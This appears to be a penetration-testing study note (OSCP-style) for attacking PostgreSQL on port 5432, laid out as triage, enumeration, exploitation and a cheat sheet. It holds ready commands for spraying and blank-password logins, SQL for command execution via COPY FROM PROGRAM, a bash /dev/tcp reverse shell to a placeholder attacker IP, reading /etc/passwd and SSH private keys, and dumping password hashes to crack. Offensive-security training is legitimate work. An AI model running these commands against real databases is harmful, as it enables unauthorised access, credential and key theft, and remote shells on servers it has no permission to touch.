# 🔧 PostgreSQL — Port 5432

> **Open-source relational database** (5432/TCP, often localhost-bound). Auth = roles + `pg_hba.conf` rules (`trust` = no password, `md5`, `scram-sha-256`, `peer`). On OSCP its headline is **RCE via `COPY ... FROM PROGRAM`** when you log in as a superuser (default `postgres`), plus file read/write (`pg_read_file` / `COPY ... TO`) and reused-credential access. Weak/blank `postgres`, `trust` misconfig, and creds from web configs are the usual way in.

Related: [[Credential Attacks]] · [[HTTP]] · [[SSH]] · [[Linux Privilege Escalation]] · [[Shells]]

---

## 🧠 PORT 5432 → THINK
- **Try `postgres` with blank / `postgres` / reused creds.**
- Superuser? → **`COPY t FROM PROGRAM 'cmd'`** = command execution.
- Creds in `.env`/`config` from [[HTTP]] → reuse here + [[SSH]].
- File read/write via `pg_read_file` / `COPY ... TO`.
- Often localhost-bound → shine after a foothold.

## ⚡ QUICK TRIAGE (60 sec)
```bash
export IP=10.10.10.10
```

```bash
nmap -p5432 -sV $IP
```

```bash
psql "host=$IP user=postgres password=postgres dbname=postgres"    # weak
```

```bash
PGPASSWORD='' psql -h $IP -U postgres                              # blank
```
**Verdict:** login works → check superuser → try `COPY FROM PROGRAM`. Fails → spray reused creds.

## ⏱️ ENUMERATE
```bash
netexec postgres $IP -u postgres -p postgres           # quick auth check
```

```bash
netexec postgres $IP -u users.txt -p passwords.txt --continue-on-success
```

```bash
# trust auth: a plain psql -h $IP -U postgres may connect with NO password
psql -h $IP -U postgres -c "SELECT version();"
```

```bash
psql -h $IP -U postgres -c "SELECT usename,usesuper FROM pg_user;"   # who is superuser
```

```bash
psql -h $IP -U postgres -c "\l"                        # databases
```

```bash
psql -h $IP -U postgres -c "\du"                       # roles/privileges
```

```bash
# List/dump tables; file read (superuser)
psql -h $IP -U postgres -d appdb -c "\dt"
```

```bash
psql -h $IP -U postgres -d appdb -c "SELECT * FROM users;"
```

```bash
psql -h $IP -U postgres -c "SELECT pg_read_file('/etc/passwd');"
# metasploit alts: auxiliary/scanner/postgres/postgres_login ; exploit/multi/postgres/postgres_copy_from_program_cmd_exec
```
**Look for:** `usesuper = t` (→ RCE/file ops), extra databases, app tables with creds, readable sensitive files.

## 🗡️ EXPLOIT
- 🟢 **Superuser + `COPY FROM PROGRAM` → RCE.**
- 🟢 **Weak/blank/reused/`trust` creds → login → dump secrets.**
- 🟡 **`pg_read_file` / `COPY TO`** → read/write files (keys, cron, webroot).
- 🟡 **Dump `pg_authid`/`pg_shadow`** hashes → crack ([[Credential Attacks]]).
- 🔵 **Version-specific CVEs** (older extension/`COPY` bugs) — confirm exact version.

**RCE via COPY FROM PROGRAM (superuser required):**
```sql
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';          -- runs as the postgres OS user
SELECT * FROM cmd_exec;                    -- read output
-- reverse shell:
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/<YOUR_IP>/443 0>&1"';
```
**File read (superuser):**
```sql
CREATE TABLE f(t text); COPY f FROM '/home/user/.ssh/id_rsa'; SELECT * FROM f;
```
**After access:** shell as the `postgres` OS user → check sudo rights, cron, whether postgres can read other users' files → [[Linux Privilege Escalation]]; or SSH via a recovered key. Dump `pg_authid` hashes + app user tables → crack → reuse on [[SSH]].

## 🔁 FOUND → NEXT
| FINDING | MEANING | NEXT | RESULT |
|---|---|---|---|
| `usesuper=t` | Superuser | `COPY FROM PROGRAM` | RCE |
| Blank/`trust` login | No auth needed | connect + enumerate | secrets/RCE |
| App creds in tables | Reuse | crack/test on SSH/web | lateral |
| `pg_read_file` works | File read | grab keys/configs | creds |
| Shell as postgres | Foothold | sudo -l / linpeas | privesc |

## 🚧 FAILED → NEXT
| Problem | Do this |
|---|---|
| Login denied | Spray reused creds; try `trust` (`psql -U postgres` no pw); check other roles |
| Not superuser | No `COPY FROM PROGRAM`/file ops — dump data, crack `pg_authid` if readable, reuse creds |
| `COPY FROM PROGRAM` denied | You're not superuser — escalate role or find superuser creds |
| Can't reach 5432 | Localhost-bound — port-forward after foothold ([[Pivoting and Port Forwarding]]) |
| Reverse shell won't fire | Try `TO PROGRAM`/staged payload; check egress port; use `nc`/`bash` variants ([[Shells]]) |

## 📋 REFERENCE — mistakes · don't-miss · stop
**Mistakes:** not trying **`trust`/blank** auth · forgetting to **check `usesuper`** before attempting RCE · not **reusing web-config creds** here and on SSH · ignoring localhost-bound Postgres after gaining a foothold.
**Reuse:** creds/hashes → [[SSH]], web logins, other DBs ([[MySQL]], [[MSSQL]]); web `.env`/config → creds here. See [[Credential Attacks]].
**Don't miss:** blank/`trust`/reused creds · `SELECT usesuper FROM pg_user` · `COPY FROM PROGRAM` RCE if superuser · `pg_read_file` sensitive files · dump app tables + `pg_authid` → crack · reuse creds on SSH · revisit after foothold if localhost-bound.
**Stop when:** no creds, not superuser, nothing dumpable → move on; revisit post-foothold or with creds found elsewhere. Superuser RCE → work shifts to [[Linux Privilege Escalation]].

## 📇 CHEAT SHEET
```bash
netexec postgres $IP -u postgres -p postgres
```

```bash
PGPASSWORD=postgres psql -h $IP -U postgres -c "SELECT usename,usesuper FROM pg_user;"
```

```bash
# RCE (superuser):
psql -h $IP -U postgres -c "CREATE TABLE c(o text); COPY c FROM PROGRAM 'id'; SELECT * FROM c;"
```

```bash
# File read:
psql -h $IP -U postgres -c "CREATE TABLE f(t text); COPY f FROM '/etc/passwd'; SELECT * FROM f;"
```
**Kill shots:** superuser → `COPY FROM PROGRAM` → shell · reused creds → dump/crack → SSH.
